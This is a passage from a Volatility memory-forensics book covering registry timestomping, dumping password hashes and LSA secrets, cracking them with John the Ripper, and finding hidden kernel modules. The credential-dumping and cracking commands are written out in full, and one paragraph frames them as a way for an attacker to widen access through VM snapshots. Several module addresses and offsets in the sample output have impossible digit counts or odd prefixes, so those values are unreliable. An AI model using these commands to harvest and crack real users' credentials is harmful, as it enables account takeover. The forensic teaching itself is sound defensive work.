$ python vol.py –f XPSP3.vmem --profile=WinXPSP3x86 shellbags
Volatility Foundation Volatility Framework 2.4
***************************************************************************
Registry: \Device\HarddiskVolume1\Documents and Settings\user\NTUSER.DAT
Key: Software\Microsoft\Windows\ShellNoRoam\Bags\63\Shell
Last updated: 2012-09-25 15:49:32
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      RECENT~1.TXT   
Modified Date:  2012-09-25 15:49:16  
Create Date:    2012-08-17 14:15:02  
Access Date:    2012-09-25 12:49:16  
File Attribute: ARC
Path:           recent news.txt
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      CUSTOM~1.TXT    
Modified Date:  2012-06-18 19:52:32  
Create Date:    2012-08-17 14:15:18  
Access Date:    2012-09-25 12:52:10
File Attribute: ARC
Path:           customer emails.txt
------------------------------------------------------------
```

### Timestomping Registry Keys

It is important to note that registry key timestamps can be overwritten, or “stomped.” This anti-forensics technique hides objects from timeline-based analysis. Joakim Schicht wrote a proof-of-concept tool, `SetRegTime`, to illustrate this capability (see [http://code.google.com/p/mft2csv/wiki/SetRegTime](http://code.google.com/p/mft2csv/wiki/SetRegTime)). This tool effectively overwrites desired timestamps in registry keys by using the Windows API (specifically, `NtSetInformationKey`). As previously discussed, because the Windows API is used, changes are reflected in memory within the five-second flush time. The following example demonstrates output from the `shellbags` plugin after a registry key’s timestamp is overwritten with `SetRegTime`:

```
$ python vol.py –f XPSP3x86.vmem --profile=WinXPSP3x86 shellbags
[snip]
Registry: \Device\HarddiskVolume1\Documents and Settings\user\NTUSER.DAT 
Key: Software\Microsoft\Windows\ShellNoRoam\Bags\63\Shell
Last updated: 3024-05-21 00:00:00 
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      NEWTEX~1.TXT   
Modified Date:  2012-08-17 14:14:56  
Create Date:    2012-08-17 14:14:50  
Access Date:    2012-09-25 11:49:38
File Attribute: ARC
Path:           New Text Document.txt
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      POISON~1.PY    
Modified Date:  2012-06-18 19:52:32  
Create Date:    2012-08-17 14:15:18  
Access Date:    2012-09-25 12:52:10
File Attribute: ARC
Path:           poison_ivy.py
------------------------------------------------------------
```

The output shows the `LastWriteTime` as `3024-05-21 00:00:00`, a date clearly in the future. Notice that this new date doesn’t have any effect on the embedded timestamps in the Shellbags entries (or any other registry keys with embedded timestamps discussed in this chapter). With Shellbags entries, you know that you should have at least one embedded timestamp that has the same date as the `LastWriteTime`, which is obviously not true in this case. Therefore, if you see `LastWriteTime` timestamps that are out of sync with the values of embedded timestamps, this is an obvious flag that something is wrong with that key.

If keys without embedded timestamps are chosen for timestomping, and if the new timestomped dates are within a timeframe that seems normal (for example, not in the year 3024), it is harder for you to discover whether the timestamps of those registry keys were actually changed. In these cases, you might have to use the timestamps of other system artifacts, in conjunction with registry key timestamps, to uncover these timestomped keys. To accomplish this, you can employ the methods discussed in Chapter 18, which covers creating thorough timelines, to expose such malicious activities.

## Dumping Password Hashes

You can dump account password hashes from memory samples using the `hashdump` plugin. The `hashdump` plugin uses keys from both the `SYSTEM` and `SAM` hives, which are found automatically using the Registry API. The hashes can then be fed to your hash-cracking tool to obtain the clear text password. This plugin is a favorite for the offensive community, as you can imagine.

As Brendan Dolan-Gavitt explains in his blog (see ([http://moyix.blogspot.com/2008/02/syskey-and-sam.html](http://moyix.blogspot.com/2008/02/syskey-and-sam.html)), generally two types of password hashes are stored in the `SAM`: the LanMan (LM) hash and the NT hash. The LM hash, which suffers from some design flaws that make it easy to crack, is considered obsolete. Thus, it is disabled by default on Windows Vista, 2008, 7, and 8. It can also explicitly be disabled on Windows XP and 2003 (see [http://www.microsoft.com/security/sir/strategy/default.aspx#!password_hashes](http://www.microsoft.com/security/sir/strategy/default.aspx#!password_hashes)). The NT hash, however, is supported by all modern Windows operating systems. The `hashdump` plugin obtains both types of hashes.

The following example demonstrates how to use the `hashdump` plugin to extract password hashes:

```
$ python vol.py -f  Bob.vmem --profile=WinXPSP3x86 hashdump 
Volatility Foundation Volatility Framework 2.4
Administrator:500:e52cac67419a9a2[snip]:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b43[snip]:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9f8ac2eaebcd2e[snip]:d95e38a172b3ddaa1ce0b63bb1f5e1fb:::
SUPPORT_388945a0:1002:aad3b435b51[snip]:ad052c1cbab3ec2502df165cd25d95bd::
```

After you have obtained the password hashes, you can use a password cracker such as John the Ripper ([http://www.openwall.com/john/](http://www.openwall.com/john/)), like so:

```
$ john hashes.txt
Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2-16])
                 (SUPPORT_388945a0)
                 (Guest)
PASSWOR          (Administrator:1)
D                (Administrator:2)
[interrupted]

$ john --show hashes.txt
Administrator:PASSWORD:500:8846f7eaee8fb117ad06bdd830b7586c:::
Guest::501:31d6cfe0d16ae931b73c59d7e0c089c0:::
SUPPORT_388945a0::1002:ad052c1cbab3ec2502df165cd25d95bd:::
4 password hashes cracked, 2 left
```

You have the password, but it is in all uppercase letters, which may not be correct. If you use the community-enhanced “jumbo” version of John (see [http://insidetrust.blogspot.com/2011/01/password-cracking-using-john-ripper-jtr.html](http://insidetrust.blogspot.com/2011/01/password-cracking-using-john-ripper-jtr.html)), you can obtain the proper password, which just happens to be “password” (all lowercase) in this case:

```
$ john --show --format=LM hashes.txt | grep -v "password hashes" \
 | cut -d":" -f2 | sort -u > pass.txt

$ john --rules --wordlist=pass.txt --format=nt hashes.txt
Loaded 4 password hashes with no different salts (NT MD4 [128/128 X2 SSE2-16])
password         (Administrator)
guesses: 2  time: 0:00:00:00 DONE (Wed Jan  1 10:40:26 2014)  c/s: 3400  
      trying: Password3 - Passwording
Use the "--show" option to display all of the cracked passwords reliably
```

From an offensive view, this can be quite useful. For example, imagine that you have obtained access to a VMware ESX server with several virtual machines. You could then crack the passwords to each of the machines by accessing the snapshot memory files of each machine. Suddenly your attack space has substantially increased!

## Obtaining LSA Secrets

The `lsadump` plugin dumps decrypted LSA secrets from the registries of all supported Windows machines ([http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html](http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html)). This exposes information such as the default password (for systems with auto-login enabled), the RDP private key, and credentials used by Data Protection API (DPAPI ). The `lsadump` plugin uses both the `SYSTEM` and `SECURITY` hives, which are found automatically using the Registry API.

Some of the items that you can find in LSA Secrets include these:

- `$MACHINE.ACC`: Domain authentication ([http://support.microsoft.com/kb/175468)](http://support.microsoft.com/kb/175468)).
- `DefaultPassword`: Password used to log on to Windows when auto-login is enabled.
- `NL$KM`: Secret key used to encrypt cached domain passwords ([http://moyix.blogspot.com/2008/02/cached-domain-credentials.html](http://moyix.blogspot.com/2008/02/cached-domain-credentials.html)).
- `L$RTMTIMEBOMB_*`: Timestamp giving the date when an unactivated copy of Windows will stop working.
- `L$HYDRAENCKEY_*`: Private key used for Remote Desktop Protocol (RDP). If you also have a packet capture from a system that was attacked via RDP, you can extract the client’s public key from the packet capture and the server’s private key from memory; then decrypt the traffic.

You can see an example of the `lsadump` plugin in action in the following output, which shows the LSA Secret for the private RDP key:

```
$ python vol.py -f  XPSP3x86.vmem --profile=WinXPSP3x86 lsadump 
 Volatility Foundation Volatility Framework 2.4
 [snip]
 L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
 0x00000000  52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00   RSA2H.......?...
 0x00000010  01 00 01 00 f1 93 70 67 69 62 de d1 aa f0 99 67   ......pgib.....g
 0x00000020  83 bb 95 20 a0 de 05 a7 40 7b 7e 5e a9 d2 f5 bd   ........@{~^....
 0x00000030  52 37 18 c2 b5 6d f0 78 b3 cc 7e e0 b8 b7 70 01   R7...m.x..~...p.
 0x00000040  33 bf fb 3d 75 69 d8 e1 84 b4 ab b8 bc 82 63 d9   3..=ui........c.
 0x00000050  17 d3 80 d6 00 00 00 00 00 00 00 00 4d 40 cd 12   ............M@..
 0x00000060  c1 18 93 a6 ec a8 99 03 cb f7 76 ab bb 6d e8 63   ..........v..m.c
 [snip]
```

In the following output, you can see the LSA Secrets for the `DefaultPassword` and `DPAPI_SYSTEM`:

```
$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 lsadump
Volatility Foundation Volatility Framework 2.4
DefaultPassword
0x00000000  00 00 00 01 7e a3 eb 47 10 31 8b 1f 6b 54 65 5c   ....~..G.1..kTe\
0x00000010  23 67 b1 dd 03 00 00 00 00 00 00 00 3b 7e b7 96   #g..........;~..
0x00000020  d5 98 fa 71 32 24 24 b5 92 a0 8a cb 40 43 b5 24   ...q2$$.....@C.$
0x00000030  19 90 dd e3 15 96 f4 34 4e 8b 75 ea a0 49 b4 4f   .......4N.u..I.O
0x00000040  08 eb 90 ec e3 0a 7c 3d c7 87 f7 ef 3f 8a 5f ad   ......|=....?._.
0x00000050  c1 d7 f2 8f 01 99 98 c3 e1 8e 97 c9               ............
DPAPI_SYSTEM
0x00000000  00 00 00 01 7e a3 eb 47 10 31 8b 1f 6b 54 65 5c   ....~..G.1..kTe\
0x00000010  23 67 b1 dd 03 00 00 00 00 00 00 00 2b 04 ff 76   #g..........+..v
0x00000020  30 d3 c5 53 7b 8c 98 15 92 9b ab ec 68 83 7e cd   0..S{.......h.~.
0x00000030  f8 f8 17 6b ba 6a 68 f2 28 57 17 1a 89 1d f7 fd   ...k.jh.(W......
0x00000040  e9 97 32 fc a3 61 ce bc a1 3c 95 b6 d2 11 9b 98   ..2..a...<......
0x00000050  77 10 c9 fd 95 86 60 09 68 83 9f b0 38 ff 01 3c   w.....`.h...8..<
0x00000060  30 04 b5 47 8d eb 8c 85 2b 69 03 1b 60 67 9c 34   0..G....+i..`g.4
0x00000070  fa a5 0d 1f b5 eb 88 ea 82 92 28 40               ..........(@
```

## Summary

The registry is a core component of the Windows operating system and thus an important aspect of most digital investigations. Memory forensics enables an investigator to access the volatile parts of the registry that cannot be found on disk and discover registry modifications that may never get written back to disk. While an investigator can access cached versions of the traditional registry data that is typically stored within the file system, Volatility’s ability to analyze memory-resident registry artifacts introduces a new realm of analysis that isn’t possible with disk forensics. When you combine that power with structured analysis of the embedded data in Userassist, Shellbags, and Shimcache keys, you gain the ability to track many aspects of user activity. Additionally, by querying registry data in a memory dump, you can quickly locate malware persistence, cached passwords, and more!
# Chapter 11 Networking

Almost all malware has some sort of networking capability, whether the purpose is to contact a command and control server, spread to other machines, or create a backdoor on the system. Because the Windows OS must maintain state and pass packets it receives to the correct process or driver, it is no surprise that the involved API functions result in the creation of significant artifacts in memory. Additionally, attackers, whether remote or local, inevitably leave traces of their network activities in web browser histories, DNS caches, and so on.

This chapter provides you with an understanding of how network artifacts are created in memory and which factors are most important to your investigation. Also, you learn the significance of Microsoft fully redesigning the TCP/IP stack starting with Windows Vista; and you’ll explore two undocumented methods of recovering sockets and connections from memory dumps. Furthermore, you’ll discover why responding quickly to potential incidents is paramount, and why correlating network-related evidence in memory with external data sources such as packet captures and firewall/proxy/IDS logs is invaluable.

## Network Artifacts

The two primary types of network artifacts are sockets and connections. Sockets define endpoints for communications. Applications create *client* sockets to initiate connections to remote servers and they create *server* sockets to listen on an interface for incoming connections. You have a few ways to create ...
# Chapter 12 Windows Services

Services on Windows are usually noninteractive (they do not directly accept user input), run consistently in the background, and often run with higher privileges than most programs users launch. Examples of services include the event-logging facility, the print spooler, the host firewall, and the time daemon. Many antivirus products, including Microsoft’s own Windows Defender and Security Center, run as services. Additionally, malicious code and adversaries often leverage services for persistence (to survive reboots), to load kernel drivers, and to blend in with legitimate components of the system.

This chapter introduces you to the internals of Windows services and shows how this knowledge can help you investigate compromised systems. It explains the major advantages to extracting service-related information from RAM rather than relying on only data from the registry. To demonstrate the concepts, you’ll examine several scenarios involving malware such as Conficker, TDL3, Blazgel, and the tools adversaries use such as the Comment Crew (also known as APT1).

## Service Architecture

The diagram in [Figure 12-1](#figure12-1) shows how the key components of the Windows service architecture work together. A list of installed services and their configurations is stored in the registry under the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services` key. Each service has a dedicated subkey with various values that describe how and when the service starts; whether the service ...
# Chapter 13  
 Kernel Forensics and Rootkits

So far in this book, you’ve learned a lot about artifacts that exist in kernel memory, such as file objects, network structures, and cached registry hives. We even covered topics such as hiding processes by directly modifying kernel objects. However, you haven’t learned how to actually track down malware that runs in kernel mode by loading a driver. Furthermore, once running in the kernel, a rootkit has countless ways to evade detection and persist on a system by manipulating call tables, hooking functions, and overwriting metadata structures.

This chapter shows you how memory forensics can help you detect high-profile rootkits such as ZeroAccess, Tigger, Blackenergy, and Stuxnet. You’ll also get some experience with combining Volatility with IDA Pro for in-depth static analysis of malicious kernel modules.

## Kernel Modules

The diagram shown in [Figure 13-1](#figure13-1) displays, at a high level, some of the concepts covered in this chapter. When you’re performing kernel memory forensics, you’re often hunting down a malicious kernel module—and there are *many* ways to do that. As shown in the diagram, the kernel debugger data block has a member named `PsLoadedModuleList` that points to a doubly linked list of `KLDR_DATA_TABLE_ENTRY` structures. These contain metadata about each kernel module, such as where to find its base address (i.e., the start of the PE file), the size of the module, and the full path to the module’s file on disk. APIs on the live system, and consequently any forensic tools that rely on those APIs, enumerate modules by walking this list. Thus, rootkits can hide their presence by unlinking an entry. In the diagram, the entry in the middle has been unlinked.

Despite the fact that an entry has been unlinked, the metadata structure is still intact (i.e., not zeroed out). Thus, it’s possible to find the structure(s) by using a pool-scanning approach (see Chapter 5). In particular, the metadata structures exist in pools tagged with `MmLd`, which is how the Volatility `modscan` plugin finds them. Moving on to a slightly more thorough rootkit, assume that the metadata structure is unlinked and then overwritten with all zeros, including the pool tag. In this case, neither list walking nor pool tag scanning can identify the hidden module. But don’t worry—only the metadata is targeted here. The actual data (i.e., the portable executable [PE] file and all its functions) is still accessible.

![c13f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f001.png)

*[**Figure 13-1:**](#figureanchor13-1) A high-level overview of some of the artifacts in kernel memory that can help you find malicious modules*

If you encounter a rootkit that hides in the aforementioned ways, you can still perform a brute force scan through kernel memory looking for PE headers (e.g., the MZ signature). Specifically, look for instances in which the base address is not represented in the linked list of modules, which is a strong indicator that the PE file you found is hidden. Unfortunately, this technique doesn’t help you recover the full path on disk to the module, but at least you can extract it from memory and perform static analysis of the binary.

Now consider an even stealthier rootkit that also wipes out its PE header (and the MZ signature). Once loaded into memory, these values are nonessential and can easily be corrupted for anti-forensics. One comforting fact that you can rely on, however, is that the malicious kernel module’s code must remain in memory in order for the rootkit to function. In other words, no matter how many ways it hides, it still must retain some presence, which is the weakness that you can exploit for detection.

For example, if the module wants to monitor API calls, it hooks the System Service Dispatch Table (SSDT), described later in the chapter, or patches another module’s code section with instructions that redirect control to the rootkit function. If it wants to communicate with processes in user mode, it needs a driver object (see the `driverscan` plugin) and one or more devices (the `devicetree` plugin). At any point, if the module launches additional threads to carry out tasks concurrently, it results in the creation of a new thread object that has a starting address pointing directly at the module’s code.

In this chapter, you’ll see how to leverage these indirect artifacts to locate and extract the malicious kernel module’s code, regardless of how it hides.

### Classifying Modules

A typical Windows system has hundreds of kernel modules, so identifying the malicious one(s) can require a good amount of effort. As you read through this chapter, keep the following questions in mind. They will help you determine which modules to focus on during an investigation:

- **Is it unlinked or hidden?** With the exception of some antivirus products that try to hide from malware, there’s no legitimate reason to unlink a module’s metadata structure.
- **Does it handle any interrupts?** Although third-party kernel modules can register their own interrupt handlers, the NT module (`ntoskrnl.exe`, `ntkrnlpa.exe`, etc.) should always be the handler of critical interrupts such as the page fault, breakpoint trap, and system service dispatcher. You can check these with the Volatility `idt` plugin.
- **Does it provide any system APIs?** When user mode applications call system APIs, the address of the API in kernel memory is resolved using a table of pointers called the SSDT. An adversary can overwrite these pointers, except in some cases on 64-bit platforms with Patchguard enabled. Typically, the only modules that should be involved are the NT module, the Windows graphical user interface (GUI) subsystem module (`win32k.sys`), the IIS support driver (`spud.sys`), and some antivirus products.
- **Is the driver signed?** On 64-bit systems, all kernel modules need to be signed. You should check that the signer is legitimate, the certificate hasn’t expired, and so on. You’ll need the corresponding kernel module files from disk to verify the signatures, however, due to the changes that occur when loading modules into memory.
- **Are the names and paths valid?** Sometimes a very simple indicator, such as the module’s name or full path on disk, can reveal suspicious behaviors. For example, Stuxnet used hard-coded names such as `MRxNet.sys`, and Blackenergy loaded a module whose name was entirely composed of hex characters (e.g., `000000BD8.sys`). It’s also a good idea to make sure that modules aren’t loaded from temporary paths.
- **Does it install any callbacks?** As you’ll see later in the chapter, callbacks provide a mechanism to receive notification when particular events occur, such as when new processes start or a crash dump is about to be created. You’ll want to be aware of which callbacks, if any, a particular module has registered.
- **Does it create any devices?** Devices often have a name, which means you can use them for indicators of compromise (provided that they’re not randomly generated). You’ll also want to see whether a driver’s devices are acting as a filter by attaching to the keyboard, network, or file system driver stacks.
- **Are there any known signatures?** Last but not least, brute force code content checks can be very useful. Extract a module from memory, or all of them for that matter, and scan them with antivirus signatures or Yara rules.

### How Modules Are Loaded

The simple act of loading a kernel module results in the creation of various artifacts in memory. However, the exact evidence depends on the technique used. Here is a short description of the possible methods and some of the traces you can expect to find:

- **Service Control Manager (SCM):** Microsoft’s recommended way to load kernel modules is to create a service (`CreateService`) of type `SERVICE_KERNEL_DRIVER` and then start the service (`StartService`). As described in Chapter 12, these APIs automatically create a subkey in the registry under `CurrentControlSet\services` named according to the new service. This method also generates event log messages if auditing is enabled. Furthermore, a new service record structure is created in the memory of `services.exe` (see the `svcscan` plugin). It’s possible to unload the driver by simply stopping the service.
- **NtLoadDriver:** Chapter 12 described a malware sample that bypassed some of the forensic artifacts that the SCM method left. Although the registry keys are still required, if you directly call `NtLoadDriver` (instead of `CreateService` and `StartService`), the event log messages are not emitted, and `services.exe` is not notified of the activity. You can still easily unload the module by calling `NtUnloadDriver`.
- **NtSetSystemInformation:** A slightly stealthier method of loading modules involves calling this API with the `SystemLoadAndCallImage` class (see [http://www.shmoo.com/mail/bugtraq/aug00/msg00404.shtml](http://www.shmoo.com/mail/bugtraq/aug00/msg00404.shtml)). Although this is the only method that does not require registry entries, after you load a module in this manner there is no easy way to unload it—short of rebooting the machine.

Now that you’ve seen the APIs required for each of these methods, you can recognize them when analyzing an application’s imported function calls.

### Enumerating Modules on Live Systems

It’s important to become familiar with the ways in which live tools enumerate kernel modules to understand how they’re often subverted. A list of the available resources follows:

- **Process Explorer:** If you click the `System` process and choose View ⇒ Lower Pane View ⇒ DLLs, you’ll see the list of currently loaded kernel modules. [Figure 13-2](#figure13-2) shows an image of the way it appears.

![c13f002.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f002.png)

*[**Figure 13-2:**](#figureanchor13-2) Process Explorer can show loaded kernel modules in the lower pane when you select the System process.*

- **Windows API:** The `EnumDeviceDrivers` function (see `K32EnumDeviceDrivers`) can retrieve the load address for each kernel module. Internally, these helper APIs call `NtQuerySystemInformation`.
- **Windows Management Instrumentation (WMI):** You can use the `Win32_SystemDriver` class to enumerate system drivers. Note that this class is derived from Win32_BaseService, so it actually consults the registry (not `NtQuerySystemInformation`) for the subset of installed services that load kernel modules.
- **Nirsoft:** The DriverView GUI application ([http://www.nirsoft.net/utils/driverview.html](http://www.nirsoft.net/utils/driverview.html)) shows a list of loaded modules generated by calling `NtQuerySystemInformation`.
- **Native API:** C or C++ programs can directly call `NtQuerySystemInformation` with the `SystemModuleInformation` class to retrieve the list of loaded kernel modules. This API, upon which so many other tools rely, references the doubly linked list of `KLDR_DATA_TABLE_ENTRY` structures described in [Figure 13-1](#figure13-1).

In short, with the exception of WMI, all the described methods directly or indirectly call the native API `NtQuerySystemInformation`. In other words, simply unlinking a metadata structure or installing an API hook is powerful enough to hide from the majority of system administration tools. It is also possible to hide from WMI by deleting the required registry keys after loading a module or by using `NtSetSystemInformation` to initially load the module.

## Modules in Memory Dumps

Volatility is well equipped to find, report on, and extract kernel modules from memory. Here’s a list of the plugins that you’ll use most frequently for these types of actions:

- `modules`: This plugin walks the doubly linked list of metadata structures pointed to by `PsLoadedModuleList`. Because newly loaded modules are always added to the end of the list, this plugin has the advantage of showing you a relative temporal relationship between modules (in other words, you can tell the order in which the modules loaded).
- `modscan`: This plugin uses pool tag scanning through the physical address space, including freed/deallocated memory, in search of `MmLd` (the module metadata pool tag). It enables you to find both unlinked and previously loaded modules.
- `unloadedmodules`: For debugging purposes, the kernel maintains a list of modules that have recently unloaded. Along with the module names, it stores timestamps to indicate exactly when they unloaded and the locations in kernel memory they used to occupy.
- `moddump`: This plugin extracts one or more kernel modules that you identify by name or base address. It can only extract currently loaded modules with valid PE headers.

### Ordered List of Active Modules

The following output shows an example of using the `modules` plugin. It’s important to understand the difference between the `Offset(V)` and `Base` columns. The prior (displayed in the far-left column) is the virtual address of the `KLDR_DATA_TABLE_ENTRY` metadata structure. The latter is the base address (also in virtual memory) of the start of the module’s PE header. Thus, on this particular system, you would expect to find the MZ signature for the NT module, `ntoskrnl.exe`, at `0xfffff80002852000`.

```
$ python vol.py -f memory.vmem --profile=Win7SP1x64 modules
Volatility Foundation Volatility Framework 2.4 
Offset(V)          Name            Base                   Size  File
------------------ --------------- ------------------ --------- ----
0xfffffa8000c32890 ntoskrnl.exe    0xfffff80002852000   0x5ea000 
  \SystemRoot\system32\ntoskrnl.exe
0xfffffa8000c327a0 hal.dll         0xfffff80002809000    0x49000 
  \SystemRoot\system32\hal.dll
0xfffffa8000c326c0 kdcom.dll       0xfffff80000b9a000     0xa000 
  \SystemRoot\system32\kdcom.dll
0xfffffa8000c2cf20 mcupdate.dll    0xfffff88000cdd000    0x4f000 
  \SystemRoot\system32\mcupdate_GenuineIntel.dll

[snip]

0xfffffa8001515e20 bthport.sys     0xfffff880022c70e000    0x8c000 
  \SystemRoot\System32\Drivers\bthport.sys
0xfffffa80014383f0 rfcomm.sys      0xfffff88003238000    0x2c000 
  \SystemRoot\system32\DRIVERS\rfcomm.sys
0xfffffa80023d3570 BthEnum.sys     0xfffff88003264000    0x10000 
  \SystemRoot\system32\DRIVERS\BthEnum.sys
0xfffffa80020461e0 bthpan.sys      0xffffc88c00f039d000    0x20000 
  \SystemRoot\system32\DRIVERS\bthpan.sys
0xfffffa80029958a0 PROCEXP152.SYS  0xffffc88f003bd000     0xd000 
  \??\C:\Windows\system32\Drivers\PROCEXP152.SYS
```

The NT module is the very first module to load, and it’s followed by `hal.dll` (the hardware abstraction layer). This makes sense because they are both primary components of the OS that need to start early. You’ll then begin to notice drivers related to specific services that start automatically at boot time, such as the kernel debugger communication (`kdcom.dll`) and Bluetooth (`BthEnum.sys`) drivers. The very end of the list shows the most recently loaded module, `PROCEXP152.SYS`, which is related to SysInternals Process Explorer—which a user interactively started.

If the system became infected with a kernel rootkit, you’d see a new entry for the malicious module added to the end (assuming that you capture memory before the next reboot and that the rootkit doesn’t try to hide its metadata structure).

### Brute Force Scanning for Modules

The output of the `modscan` plugin resembles that of which you just saw. However, there are some key differences:

- Because the module metadata structures are found by scanning through the physical address space, the column on the left, `Offset(P)`, displays a physical offset rather than an address in virtual memory.
- The modules appear in the order in which they’re found, not the order in which they were loaded.

Of course, because `modscan` also audits free and deallocated memory blocks, you can find unlinked and previously loaded modules. Here’s an example of the output:

```
$ python vol.py -f memory.vmem --profile=Win7SP1x64 modscan
Volatility Foundation Volatility Framework 2.4 
Offset(P)          Name            Base                    Size File
------------------ --------------- ------------------ --------- ----
0x000000000038ae90 mouclass.sys    0xfffff88003bd9000     0xf000 
  \SystemRoot\system32\DRIVERS\mouclass.sys
0x000000002c78c590 serenum.sys     0xfffff88003a1d000     0xc000 
  \SystemRoot\system32\DRIVERS\serenum.sys
0x000000003e0edde0 spsys.sys       0xffffc88f00321000    0x71000 
  \SystemRoot\system32\drivers\spsys.sys
0x000000003c39e058a0 PROCEXP152.SYS  0xffffc88f003bd000     0xd000 
  \??\C:\Windows\system32\Drivers\PROCEXP152.SYS
0x000000003e422360 lltdio.sys      0xffffc88f002d2000    0x15000 
  \SystemRoot\system32\DRIVERS\lltdio.sys
0x000000003e424a00 rspndr.sys      0xffffc88f002c70e000    0x18000 
  \SystemRoot\system32\DRIVERS\rspndr.sys
 [snip]
```

### Recently Unloaded Modules

The following output shows an example of the `unloadedmodules` plugin. As previously mentioned, the kernel maintains this list for debugging purposes. For example, a module may queue a Deferred Procedure Call (DPC) or schedule a timer, but then unload without cancelling it. Thus, when the procedure is invoked, the intended handler function is no longer in memory. This can cause a dangling pointer issue and lead to unpredictable consequences. If the kernel didn’t keep this list of recently unloaded modules and the address ranges they used to occupy, it would be next to impossible to determine which module is buggy.

```
$ python vol.py -f memory.vmem --profile=Win7SP1x64 unloadedmodules
Volatility Foundation Volatility Framework 2.4 
Name                 StartAddress       EndAddress         Time
-------------------- ------------------ ------------------ ----
dump_dumpfve.sys     0xfffff8800167b000 0xfffff8800168e000 2014-03-27 17:22:20 
dump_LSI_SAS.sys     0xfffff8800165e000 0xfffff8800167b000 2014-03-27 17:22:20 
dump_storport.sys    0xfffff88001654000 0xfffff8800165e000 2014-03-27 17:22:20 
crashdmp.sys         0xfffff88001646000 0xfffff88001654000 2014-03-27 17:22:20 
bthpan.sys           0xffffc88f002b2000 0xffffc88f002d2000 2014-04-08 16:43:31 
rfcomm.sys           0xffffc88f00276000 0xffffc88f002a2000 2014-04-08 16:43:31 
BthEnum.sys          0xffffc88f002a2000 0xffffc88f002b2000 2014-04-08 16:43:31 
BTHUSB.sys           0xfffff88003ca8000 0xfffff88003cc0000 2014-04-08 16:43:31
[snip]
```

The unloaded module list can also come in handy for forensics and malware investigations, particularly when rootkits attempt to unload quickly (i.e., the *get in, get out* approach). As shown in the following example from a Rustock.C variant, you cannot find the `xxx.sys` module in the active modules list or by pool tag scanning. However, in an entirely different data structure, the kernel remembers that the malicious module once loaded.

```
$ python vol.py -f rustock-c.vmem --profile=WinXPSP3x86 unloadedmodules
Volatility Foundation Volatility Framework 2.4 
Name                 StartAddress EndAddress Time
-------------------- ------------ ---------- ----
Sfloppy.SYS          0x00f8b92000 0xf8b95000 2010-12-31 18:46:04 
Cdaudio.SYS          0x00f89d2000 0xf89d7000 2010-12-31 18:46:04 
splitter.sys         0x00f8c1c000 0xf8c1e000 2010-12-31 18:46:40 
swmidi.sys           0x00f871a000 0xf8728000 2010-12-31 18:46:41 
aec.sys              0x00f75d8000 0xf75fb000 2010-12-31 18:46:41 
DMusic.sys           0x00f78d0000 0xf78dd000 2010-12-31 18:46:41 
drmkaud.sys          0x00f8d9c000 0xf8d9d000 2010-12-31 18:46:41 
kmixer.sys           0x00f75ae000 0xf75d8000 2010-12-31 18:46:46 
xxx.sys              0x00f6f88000 0xf6fc2000 2010-12-31 18:47:57 

$ python vol.py -f rustock-c.vmem --profile=WinXPSP3x86 modules | grep xxx
$ python vol.py -f rustock-c.vmem --profile=WinXPSP3x86 modscan | grep xxx
```

Unfortunately, because the `xxx.sys` module did in fact unload, you can no longer expect to dump it out of memory. However, at least you have a timestamp associated with the activity that you can use in timeline-based investigations, and you also have the name of the file on disk, so you can attempt to recover it from the file system.

### Extracting Kernel Modules

Provided that a kernel module is still loaded into memory, you can extract it for static analysis with the `moddump` plugin. The available command-line options are shown here:

```
$ python vol.py -f memory.vmem --profile=Win7SP1x64 moddump
[snip]

 -D DUMP_DIR, --dump-dir=DUMP_DIR
                        Directory in which to dump executable files
  -u, --unsafe          Bypasses certain sanity checks when creating image
  -r REGEX, --regex=REGEX
                        Dump modules matching REGEX
  -i, --ignore-case     Ignore case in pattern match
  -b BASE, --base=BASE  Dump driver with BASE address (in hex)
  -m, --memory          Carve as a memory sample rather than exe/dis

---------------------------------
Module ModDump
---------------------------------
Dump a kernel driver to an executable file sample
```

To extract all currently loaded modules, just supply a path to your desired output directory, like this:

```
$ python vol.py –f memory.dmp
      --profile=Win7SP1x64 moddump 
      –-dump-dir=OUTDIR 

Volatility Foundation Volatility Framework 2.4 
Module Base        Module Name          Result
------------------ -------------------- ------
0xfffff8000281b000 ntoskrnl.exe         OK: driver.fffff8000281b000.sys
0xfffff80002e05000 hal.dll              OK: driver.fffff80002e05000.sys
0xfffff88002b53000 peauth.sys           OK: driver.fffff88002b53000.sys
0xfffff88002ad9000 mrxsmb10.sys         OK: driver.fffff88002ad9000.sys
0xfffff88000f3c000 WMILIB.SYS           OK: driver.fffff88000f3c000.sys
0xfffff8800183a000 disk.sys             OK: driver.fffff8800183a000.sys
0xffffc88f00493000 portcls.sys          OK: driver.ffffc88f00493000.sys
0xfffff88000e1b000 termdd.sys           OK: driver.fffff88000e1b000.sys
0xfffff880042a8000 HIDPARSE.SYS         OK: driver.fffff880042a8000.sys
0xfffff880027dd000 rspndr.sys           OK: driver.fffff880027dd000.sys
0xfffff880042be000 vmusbmouse.sys       OK: driver.fffff880042be000.sys
0xfffff88000c00000 CI.dll               OK: driver.fffff88000c00000.sys
[snip]
```

Notice how the name of the output file is `driver.ADDR.sys` where `ADDR` is the base address of the module in kernel memory. Because only one module can occupy a given address at a time, the naming convention ensures that the output file names are unique (as opposed to basing them on the module’s name, which can cause conflicts).

In the next example, we extract modules using a case-insensitive regular expression. The `tcp` criteria matched two modules, `tcpip.sys` and `tcpipreg.sys`.

```
$ python vol.py –f memory.dmp 
      --profile=Win7SP1x64 moddump 
      --regex=tcp –-ignore-case 
      --dump-dir=OUTDIR/ 

Volatility Foundation Volatility Framework 2.4 
Module Base        Module Name          Result
------------------ -------------------- ------
0xfffff880018d3000 tcpip.sys            OK: driver.fffff880018d3000.sys
